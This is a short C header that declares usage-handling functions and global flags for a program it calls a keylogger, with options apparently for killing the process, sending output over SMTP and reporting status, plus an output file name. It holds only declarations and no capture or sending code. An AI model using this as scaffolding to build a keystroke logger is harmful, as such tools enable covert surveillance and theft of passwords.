#ifndef USAGE_H
#define USAGE_H

#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

int keylogger_usage(int argc, char **argv);
int flag_kill;
int flag_smtp;
int flag_status;
int smtp_status;
int smtp_help;
int flags;
int opt;
void smtp_helper();
extern char outfile[100];

#endif
